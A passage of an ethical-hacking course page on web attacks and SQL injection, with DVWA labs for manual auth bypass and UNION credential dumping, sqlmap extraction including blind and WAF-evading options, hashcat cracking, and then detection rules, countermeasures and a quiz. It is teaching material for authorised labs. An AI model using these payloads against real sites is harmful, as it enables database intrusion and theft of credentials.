+      <p class="lede">Do the whole thing manually: bypass the login, then UNION your way to every username and password hash. No tools &mdash; just SQL.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Prove you can do it without sqlmap</span><p>Anyone can run sqlmap; the skill is understanding it. In this lab you inject by hand &mdash; auth bypass, then the four-step UNION extraction &mdash; so that when you run the tool in Lab D you can verify and trust it. DVWA on Low, then raise the level to feel the difference.</p></div>
+      <ol class="steps">
+<li>
+<b>Auth bypass</b> &mdash; on any DVWA login-style field, confirm injection:
+<pre><code>' OR '1'='1' -- -
+# logged in with no valid password -> input reaches the query unsanitised</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The bypass confirms the parameter is injectable &mdash; the precondition for extraction.</li></ul></div>
+</li>
+<li>
+<b>Find the column count</b> &mdash; DVWA &rarr; SQL Injection, Low, in the id field:
+<pre><code>1' ORDER BY 1 -- -     # ok
+1' ORDER BY 2 -- -     # ok
+1' ORDER BY 3 -- -     # ERROR -> there are 2 columns</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">ORDER BY</span> climbs until it errors; the last working number is the column count UNION must match.</li></ul></div>
+</li>
+<li>
+<b>Map the database</b> &mdash; find the tables and the columns of <span class="mono">users</span>:
+<pre><code>1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -
+1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' -- -</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">information_schema</span> reveals the <span class="mono">users</span> table and its <span class="mono">user</span>/<span class="mono">password</span> columns &mdash; on a schema you had never seen.</li></ul></div>
+</li>
+<li>
+<b>Dump the credentials</b> and take the hashes to Session 4&#39;s cracking:
+<pre><code>1' UNION SELECT user,password FROM users -- -
+# admin : 5f4dcc3b5aa765d61d8327deb882cf99  (md5 'password')
+# feed the hashes to:  hashcat -m 0 hashes.txt rockyou.txt</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You extracted every credential by hand and closed the loop to Session 4 &mdash; SQLi gives the hashes, hashcat cracks them. Now raise DVWA to Medium and note Burp is needed to reach the parameter.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">You own the database, manually</span><p><strong class="hl">Bypass, count, map, dump &mdash; by hand.</strong> You now understand every request sqlmap will send. That understanding is what separates an operator from someone who only runs a tool.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab D: sqlmap">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P23</span><span class="tag lab">Hands-on &middot; everyone &middot; automate</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab D &mdash; Automate with sqlmap, Then Verify</h1>
+      <p class="lede">Run sqlmap against the same target and confirm it reproduces &mdash; and extends &mdash; your manual result, including the blind case.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Trust, but verify</span><p>You dumped the users table by hand in Lab C. Now let sqlmap do it, and check its output against what you already know is true. Then point it at a <em>blind</em> parameter &mdash; the case you could not realistically finish manually &mdash; and watch it extract anyway.</p></div>
+      <ol class="steps">
+<li>
+<b>Capture a real request</b> in Burp and save it &mdash; this keeps your session cookie and exact parameters:
+<pre><code># Burp -> right-click the SQLi request -> 'Copy to file' -> request.txt
+# (or grab the PHPSESSID + security cookie for the -u form)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Feeding sqlmap the real request means it authenticates exactly as your browser did &mdash; no guesswork about cookies or CSRF tokens.</li></ul></div>
+</li>
+<li>
+<b>Detect + enumerate</b> &mdash; confirm sqlmap finds what you found by hand:
+<pre><code>sqlmap -r request.txt --batch --dbs
+sqlmap -r request.txt --batch -D dvwa --tables
+sqlmap -r request.txt --batch -D dvwa -T users --dump</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>sqlmap reports the technique and DBMS, then dumps the same users table you extracted manually &mdash; verification that both you and the tool are correct.</li></ul></div>
+</li>
+<li>
+<b>Do the blind case</b> &mdash; point it at DVWA &rarr; SQL Injection (Blind), which you could not finish by hand:
+<pre><code>sqlmap -r blind_request.txt --batch --technique=BT -D dvwa -T users --dump
+# B = boolean-blind, T = time-based — sqlmap sends the thousands of yes/no probes for you</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The tool extracts data with <em>no visible output</em>, exactly the boolean/time method from P19 &mdash; automated to completion. This is where sqlmap earns its place.</li></ul></div>
+</li>
+<li>
+<b>Note the noise</b> &mdash; look at how many requests it sent, then how you would reduce it:
+<pre><code># sqlmap logs hundreds/thousands of requests. On a real engagement:
+sqlmap -r request.txt --batch --delay=1 --random-agent --level=2
+# --delay throttles, --random-agent hides the default UA, tamper scripts dodge WAFs</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Seeing the request volume makes the SOC flip concrete &mdash; and teaches the tuning that separates a smash-and-grab from a careful test.</li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">The tool extends your reach</span><p><strong class="hl">sqlmap confirms the visible case and conquers the blind one.</strong> You verified it against your own manual dump and then let it do the part no human finishes by hand. Understanding + automation is the whole craft.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The web-attack SOC flip">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P24</span><span class="tag defensive">Defender &middot; the consolidated flip</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Every Attack Today, and the Log It Left</h1>
+      <p class="lede">You attacked all afternoon. Here is the defender&#39;s view &mdash; each web attack is an HTTP request, and the access log saw all of it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Web attacks are readable</span><p>Unlike a binary exploit, every attack in this session is <strong>HTTP text</strong> &mdash; a payload in a URL, a header, or a body. That means the web-server <strong>access log</strong> and a <strong>WAF</strong> can see and match them. Learn the signature of each and you can detect what you just did. Click each.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 300" role="img" aria-label="Interactive map: four web attacks in orange on the left, each paired with its access-log/WAF signature in green on the right. Click each.">
+          <text x="235" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#ff7043">ATTACKER sent</text>
+          <text x="705" y="26" text-anchor="middle" font-size="13" class="d-title" fill="#4ade80">SOC sees (access log / WAF)</text>
+          <line x1="470" y1="40" x2="470" y2="286" stroke="#333b4c" stroke-width="1.2" stroke-dasharray="3 4"/>
+          <g class="node" data-node="enum" tabindex="0"><rect x="20" y="48" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="70" font-size="12">Enumeration (gobuster/ffuf)</text><text class="d-sub" x="38" y="90" class="d-mono">hundreds of paths from a wordlist</text></g>
+          <rect x="490" y="48" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="70" font-size="13" fill="#4ade80" class="d-mono">404 spike</text><text class="d-sub" x="640" y="70">per source IP</text><text class="d-sub" x="508" y="90">hundreds of 404s/min from one IP = scan</text><path d="M450,74 L488,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="xss" tabindex="0"><rect x="20" y="112" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="134" font-size="12">XSS</text><text class="d-sub" x="38" y="154" class="d-mono">&lt;script&gt; / onerror= in a parameter</text></g>
+          <rect x="490" y="112" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="134" font-size="13" fill="#4ade80" class="d-mono">tag in the query</text><text class="d-sub" x="508" y="154">%3Cscript%3E / onerror in URL or body = XSS attempt</text><path d="M450,138 L488,138" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="sqli" tabindex="0"><rect x="20" y="176" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="198" font-size="12">SQL injection</text><text class="d-sub" x="38" y="218" class="d-mono">' UNION SELECT / information_schema / SLEEP(</text></g>
+          <rect x="490" y="176" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="198" font-size="13" fill="#4ade80" class="d-mono">SQL keywords in a param</text><text class="d-sub" x="508" y="218">UNION/SELECT/SLEEP/quote-heavy input = SQLi</text><path d="M450,202 L488,202" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="rce" tabindex="0"><rect x="20" y="240" width="430" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="262" font-size="12">Webshell upload / cmd injection</text><text class="d-sub" x="38" y="279" class="d-mono">POST .php ; then GET /uploads/x.php ; ?c=id</text></g>
+          <rect x="490" y="240" width="430" height="46" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="260" font-size="12.5" fill="#4ade80">new .php requested + web spawns shell</text><text class="d-sub" x="508" y="278">GET to a new upload path; apache&rarr;sh child (EDR)</text><path d="M450,263 L488,263" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the log signature and the field a detection rule keys on.</div>
+        <div class="dgm-detail" data-detail="enum"><h5><span class="dd-tag">ENUMERATION &rarr; 404 spike</span>The loudest recon</h5><p><b>Content discovery generates hundreds to thousands of 404s from a single IP in seconds.</b> Rule: threshold on 4xx (especially 404) rate per source IP over a short window. Also flags the tool&#39;s default User-Agent. The earliest, easiest web detection.</p></div>
+        <div class="dgm-detail" data-detail="xss"><h5><span class="dd-tag">XSS &rarr; tags in the request</span>Markup where data belongs</h5><p><b>A parameter value containing <span class="mono">&lt;script&gt;</span>, <span class="mono">onerror=</span>, <span class="mono">&lt;svg</span>, or their URL-encoded forms (<span class="mono">%3Cscript%3E</span>).</b> Rule/WAF: HTML/JS constructs in fields that should hold plain data. False positives on rich-text fields &mdash; tune per parameter.</p></div>
+        <div class="dgm-detail" data-detail="sqli"><h5><span class="dd-tag">SQLi &rarr; SQL keywords in a param</span>Query language in the input</h5><p><b>SQL syntax where a value belongs: <span class="mono">UNION SELECT</span>, <span class="mono">information_schema</span>, <span class="mono">' OR '1'='1</span>, <span class="mono">SLEEP(</span>, comment sequences.</b> Rule/WAF: SQL tokens + quote-heavy input in a parameter. sqlmap adds volume and a signature UA. High-value, low-false-positive when scoped to numeric/short fields.</p></div>
+        <div class="dgm-detail" data-detail="rce"><h5><span class="dd-tag">UPLOAD/CMDi &rarr; two signals</span>The request and the aftermath</h5><p><b>Web log: a POST to an upload endpoint followed by a GET to a new <span class="mono">.php</span> under <span class="mono">/uploads/</span>; command injection shows shell metacharacters (<span class="mono">;</span> <span class="mono">|</span> <span class="mono">`</span>) in a parameter.</b> Host/EDR: the web process (<span class="mono">apache</span>/<span class="mono">php-fpm</span>) spawning <span class="mono">sh</span>/<span class="mono">bash</span> &mdash; an abnormal process tree that catches RCE even when the payload was obfuscated.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">Every payload is a log line</span><p><strong class="hl hl-d">Web attacks are HTTP, so they are visible.</strong> A 404 spike, markup in a field, SQL keywords in a parameter, a web process spawning a shell &mdash; each is a rule. That reachability is why WAFs and access-log monitoring work, and it is your Lab E.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab E: detect &amp; report">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P25</span><span class="tag lab">Hands-on &middot; deliverable</span><span class="time">&#9201; 20 min</span></div>
+      <h1>Lab E &mdash; Detect the Attacks, Then Report Them</h1>
+      <p class="lede">Turn your afternoon into defence: a detection rule for the access log, and the web-app pentest finding report that ships it all.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The two deliverables</span><p>Close the loop. First, write a <strong>detection</strong> for the attacks you ran &mdash; a log/WAF rule for SQLi or XSS keyed on the signatures from P23. Second, write the <strong>finding report</strong>: each vulnerability with its evidence, impact, OWASP/severity rating, and the one fix. This is the actual product of a web-app penetration test.</p></div>
+      <h2><span class="h-t">Part 1 &mdash; a detection rule (SQLi in the access log)</span></h2>
+      <p>Sigma over web-server access logs &mdash; SQL syntax appearing in a request parameter.</p>
+      <pre><code>title: SQL Injection Attempt in Web Request
+logsource:
+  category: webserver
+detection:
+  selection:
+    cs-uri-query|contains:
+      - 'UNION SELECT'
+      - 'information_schema'
+      - "' OR '1'='1"
+      - 'SLEEP('
+      - '../'
+  condition: selection
+tags: [attack.initial_access, attack.t1190]
+level: high</code></pre>
+      <p>A quick log hunt for the same thing:</p>
+      <pre><code>grep -Ei "union select|information_schema|' or '1'='1|sleep\(" /var/log/apache2/access.log
+# a burst of these from one IP = an active SQLi attempt (probably sqlmap)</code></pre>
+      <ol class="steps">
+<li>
+<b>Test your rule</b> against your own attack traffic from Labs C&ndash;D:
+<pre><code># point the grep/Sigma at the access log your manual + sqlmap runs generated
+# it should light up on the UNION/information_schema/SLEEP requests you sent</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Your own attack is the test data &mdash; a rule that fires on traffic you generated is a validated rule.</li></ul></div>
+</li>
+<li>
+<b>Write the finding report</b> &mdash; one entry per vulnerability, using the template:
+<pre><code># per finding:
+#   Title + OWASP category (e.g. A03:2021 Injection)
+#   Severity (CVSS/qualitative) + affected endpoint/parameter
+#   Evidence (the request + the result — a screenshot or the dumped row)
+#   Impact (what an attacker gains)
+#   Remediation (the ONE fix)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Each finding is self-contained and actionable &mdash; a developer can read one entry and fix the bug without asking you anything.</li></ul></div>
+</li>
+<li>
+<b>Rank by risk</b> so the team fixes the right things first:
+<pre><code># order: SQLi (dump the DB) > file upload (RCE) > stored XSS (mass) > IDOR > reflected XSS
+# risk = impact x exploitability, not just severity label</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>A prioritised list turns a pile of bugs into a remediation plan &mdash; the difference between a scan dump and a professional report.</li></ul></div>
+</li>
+</ol>
+      <div class="box do"><span class="box-t">Deliverable</span><p>Produce the report using <span class="mono">exercises/session-08/web_finding_report_template.md</span> &mdash; the artifact you would hand a client, with your detection rule attached as the blue-team follow-up.</p></div><div class="box key-takeaway"><span class="box-t">Attack becomes defence becomes report</span><p><strong class="hl">You found it, you can detect it, you can report it.</strong> A validated log rule plus a prioritised finding report is the full output of a web-app test &mdash; and it maps straight back to every attack you ran today.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Countermeasures">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P26</span><span class="tag defensive">Defensive &middot; the fixes</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Countermeasures &mdash; One Fix Per Flaw</h1>
+      <p class="lede">Every attack today has a known, specific fix. Learn the mapping so your report ends in action, not just alarm.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Named flaw, named fix</span><p>Web vulnerabilities are well-understood, which means the remediations are precise &mdash; and mostly about the same principle: <strong>never trust input, and separate data from code</strong>. Parameterise queries, encode output, validate uploads, check authorization. Learn the one-to-one mapping and you can close every finding you wrote.</p></div>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:13%"><col style="width:42%"><col style="width:45%"></colgroup>
+      <thead><tr><th>Attack</th><th>The one primary fix</th><th>Why it works</th></tr></thead>
+      <tbody>
+      <tr><td>SQL injection</td><td><strong>Parameterised queries / prepared statements</strong></td><td>input is sent as data, never parsed as query logic &mdash; the quote can no longer escape</td></tr>
+      <tr><td>XSS</td><td><strong>Output encoding</strong> (context-aware) + Content-Security-Policy</td><td>user data is rendered as text, not markup; CSP blocks inline/injected script</td></tr>
+      <tr><td>File upload</td><td>server-side type allow-list, rename, store outside webroot, disable exec</td><td>even a malicious file cannot be executed by the web server</td></tr>
+      <tr><td>Command injection</td><td>avoid shelling out; use language APIs / strict allow-list args</td><td>input never reaches a shell to be interpreted</td></tr>
+      <tr><td>IDOR</td><td>server-side <strong>authorization</strong> on every object access</td><td>ownership is checked per request &mdash; guessing an id gains nothing</td></tr>
+      <tr><td>All</td><td>input validation, least-privilege DB/app accounts, WAF, code review</td><td>defence in depth &mdash; each layer limits what a missed bug can do</td></tr>
+      </tbody></table></div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; see the fix that ends SQLi</span><pre><code># VULNERABLE (concatenation — input becomes logic):
+#   query = "SELECT * FROM users WHERE user='" + input + "'"
+# FIXED (parameterised — input is bound as data):
+#   cur.execute("SELECT * FROM users WHERE user=%s", (input,))
+# now ' OR '1'='1 is searched for as a literal username — and simply not found</code></pre><p style="margin-top:8px"><b>You should see:</b> the parameterised version sends your payload to the database as a <em>value</em>, so <span class="mono">' OR '1'='1</span> becomes a username to look up, not logic to run. One API change closes the most impactful web flaw there is.</p></div><div class="box key-takeaway"><span class="box-t">Separate data from code</span><p><strong class="hl hl-d">Every fix is the same idea.</strong> Parameterise, encode, validate, authorize &mdash; each keeps user input as data. A WAF buys time, but the real fix is in the code, and your report should say exactly which line.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where next">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P27</span><span class="tag resources">Practice &middot; keep going</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Practice Range &mdash; Web &amp; SQLi</h1>
+      <p class="lede">Free rooms and safe deliberately-vulnerable apps to turn today&#39;s method into a reflex. Do at least one this week.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Reps on safe targets</span><p>Web skill is pattern recognition, and pattern recognition comes from reps. These free rooms and local vulnerable apps let you attack legally and endlessly &mdash; the exact DVWA/Juice-Shop/PortSwigger platforms the labs used, plus guided TryHackMe rooms.</p></div>
+      <div class="rooms"><a class="room" href="https://tryhackme.com/room/sqlinjectionlm" target="_blank" rel="noopener"><span class="room-tag free">FREE</span><span class="room-name">SQL Injection</span><span class="room-meta">in-band, blind, and time-based, hands-on &middot; mirrors Lab C</span><span class="room-note">Verified free &mdash; the full manual SQLi method you did today.</span></a><a class="room" href="https://tryhackme.com/room/owasptop10" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">OWASP Top 10</span><span class="room-meta">one room per Top-10 risk &middot; injection, XSS, access control</span><span class="room-note">Popular intro room &mdash; confirm it is free on the day; covers this whole session&#39;s families.</span></a><a class="room" href="https://tryhackme.com/room/juniorpentester" target="_blank" rel="noopener"><span class="room-tag freetier">FREE (rank)</span><span class="room-name">Web hacking path (Jr Pentester)</span><span class="room-meta">structured web-attack track &middot; XSS, SQLi, upload, IDOR</span><span class="room-note">Great structured follow-on &mdash; some rooms free; check per room.</span></a>
+      </div><div class="box do"><span class="box-t">Deliberately-vulnerable apps (run locally)</span><p>Practise the full method on your own machine: <span class="mono">DVWA</span> (the labs&#39; target, four security levels), <span class="mono">OWASP Juice Shop</span> (modern JS app, gamified), <span class="mono">bWAPP</span> (broadest bug list incl. IDOR), and <span class="mono">PortSwigger Web Security Academy</span> (free, world-class SQLi/XSS labs with solutions). All are legal to attack because you host them.</p></div><div class="box warn"><span class="box-t">The line you never cross</span><p><strong>Only attack apps you own or are explicitly authorised to test.</strong> The exact payloads here are illegal against a live third-party site &mdash; bug-bounty scope or your own lab only. Web attacks are logged, and unauthorised testing is a crime.</p></div><div class="box key-takeaway"><span class="box-t">Method becomes reflex</span><p><strong class="hl">One room or one Juice Shop challenge this week.</strong> The workflow &mdash; intercept, enumerate, test each family, extract, report &mdash; only gets fast with reps on targets you are allowed to break.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P28</span><span class="tag assess">Assess &middot; 6 questions</span><span class="time">&#9201; 10 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Six questions across the session. Answer before you reveal &mdash; each explains the reasoning, not just the letter.</p>
+    </div>
+    <div class="content">
+<div class="quiz"><div class="q mcq" data-correct="c" data-why="Client-side controls (dropdowns, JS validation, length limits) only exist in the browser; a proxy like Burp lets you edit the request after the browser is done, so the server receives your unrestricted input. The server only sees the HTTP you send.">
+  <p><span class="qn">Q1</span>Why is client-side input validation never a security control?</p>
+  <ul class="opts"><li data-opt="a">It is too slow to be effective</li><li data-opt="b">Browsers disable it by default</li><li data-opt="c">An attacker can edit the request in a proxy after the browser, so the server sees unvalidated input</li><li data-opt="d">It only works over HTTPS</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="b" data-why="Stored XSS is saved by the app and served to every visitor automatically, with no action on their part — including admins — which is why it is the highest-severity XSS flavour. Reflected needs the victim to click a crafted link.">
+  <p><span class="qn">Q2</span>Why is stored XSS more dangerous than reflected XSS?</p>
+  <ul class="opts"><li data-opt="a">It runs on the server instead of the browser</li><li data-opt="b">It fires automatically for every visitor, with no link to click</li><li data-opt="c">It cannot be filtered</li><li data-opt="d">It only affects administrators</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="d" data-why="IDOR is a broken-access-control (authorization) flaw: the app authenticates the user but fails to check the requested object belongs to them, so changing a reference id exposes others' data. Authentication is not authorization.">
+  <p><span class="qn">Q3</span>An app lets a logged-in user change ?id=123 to ?id=124 and see another user's record. What is the flaw?</p>
+  <ul class="opts"><li data-opt="a">SQL injection</li><li data-opt="b">Cross-site scripting</li><li data-opt="c">Weak authentication</li><li data-opt="d">IDOR &mdash; missing per-object authorization (broken access control)</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="a" data-why="The single quote ends the string literal that user input sits inside; if the app concatenated input into the query, everything after the quote is parsed as SQL logic. That is the entire mechanism of SQL injection.">
+  <p><span class="qn">Q4</span>Why is the single quote (') the key character in classic SQL injection?</p>
+  <ul class="opts"><li data-opt="a">It ends the string literal, so the rest of the input is parsed as SQL logic</li><li data-opt="b">It is a SQL comment</li><li data-opt="c">It encrypts the query</li><li data-opt="d">It is required by the UNION keyword</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="c" data-why="Blind SQLi has no visible output, but a true vs false condition changes the app's behaviour — a different page (boolean) or a controllable delay via SLEEP() (time-based). You infer the data one yes/no answer at a time.">
+  <p><span class="qn">Q5</span>An injectable parameter returns no data and no errors, but ' AND SLEEP(5)-- delays the response by 5 seconds. What can you do?</p>
+  <ul class="opts"><li data-opt="a">Nothing &mdash; without visible output SQLi is impossible</li><li data-opt="b">Only bypass the login, never extract data</li><li data-opt="c">Extract data blind, inferring each bit from the timing (time-based blind SQLi)</li><li data-opt="d">Only read error messages</li></ul>
+  <div class="mcq-fb"></div>
+</div><div class="q mcq" data-correct="b" data-why="Parameterised queries send user input to the database as bound data, never as part of the query text, so injected SQL is treated as a literal value and cannot change the query's logic. It is the primary, definitive SQLi fix.">
+  <p><span class="qn">Q6</span>What is the primary fix that definitively stops SQL injection?</p>
+  <ul class="opts"><li data-opt="a">A web application firewall (WAF)</li><li data-opt="b">Parameterised queries / prepared statements</li><li data-opt="c">Escaping single quotes in input</li><li data-opt="d">Hiding database error messages</li></ul>
+  <div class="mcq-fb"></div>
+</div></div><div class="box key-takeaway"><span class="box-t">Score yourself</span><p><strong class="hl">5&ndash;6 right:</strong> attack a Juice Shop or PortSwigger lab next. <strong>3&ndash;4:</strong> re-read the SQLi and XSS pages. <strong>&lt;3:</strong> rewatch the injection flow diagrams &mdash; the data-vs-code idea anchors the whole session.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Takeaways">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S08 &middot; P29</span><span class="tag summary">Wrap-up</span><span class="time">&#9201; 4 min</span></div>
+      <h1>Session 8 &mdash; What You Keep</h1>
+      <p class="lede">Ten things that outlast any single app or tool. The web changes; these principles do not.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">The durable core</span><p>You saw the web as three tiers, intercepted every request, and worked each injection family to impact &mdash; then turned all of it into detections and a report. Tools and frameworks change; the principle &mdash; the app trusts input it should not, so separate data from code &mdash; is permanent.</p></div>
+      <ol class="takeaways">
+        <li><strong>Every web vuln is data treated as code.</strong> Browser (XSS), OS (cmd-injection), database (SQLi) &mdash; same root cause, different interpreter.</li>
+        <li><strong>The server only sees the HTTP you send.</strong> Client-side validation is never security; own the request with Burp.</li>
+        <li><strong>Enumeration multiplies everything.</strong> You can only test what you find &mdash; map directories, files, and parameters first.</li>
+        <li><strong>Stored XSS fires for everyone.</strong> No click, admins included; blocklists lose, output encoding + CSP win.</li>
+        <li><strong>A stored, executable upload is a shell.</strong> The web&#39;s shortcut to a Session-5 foothold.</li>
+        <li><strong>IDOR: authn &ne; authz.</strong> Logged in is not allowed; check ownership per object, server-side.</li>
+        <li><strong>A single quote owns the database.</strong> Read the query, find where input lands, escape the string.</li>
+        <li><strong>Method follows visibility.</strong> See data &rarr; UNION; see only behaviour &rarr; blind boolean/time. No output is not no injection.</li>
+        <li><strong>Understand before you automate.</strong> sqlmap is fast because the manual method is slow &mdash; do it by hand once so you can trust the tool.</li>
+        <li><strong>Every payload is a log line.</strong> Web attacks are HTTP &mdash; detectable in the access log and WAF; the fix is parameterise, encode, validate, authorize.</li>
+      </ol><div class="box bridge"><span class="box-t">Next &mdash; Session 9</span><p>You broke the application. Session 9 drops to the <strong>network</strong> beneath it: <strong>sniffing and MITM</strong> (reading and altering traffic on the wire), <strong>session hijacking</strong> (stealing the very tokens your XSS could grab), <strong>social engineering</strong> (attacking the human), and <strong>DoS</strong> (attacking availability).</p></div><div class="box key-takeaway"><span class="box-t">The through-line</span><p><strong class="hl">Separate data from code, and never trust input.</strong> Say that about any web feature and you can predict its vulnerability and its fix &mdash; on both sides of the engagement.</p></div>
+    </div>
+  </section>
+
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">&mdash;</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">&mdash;</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">&larr;</span> <span class="kbd">&rarr;</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap"><p>CEH Diploma · ITGate Academy · Session 08 — Web Application Hacking & SQL Injection</p></div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
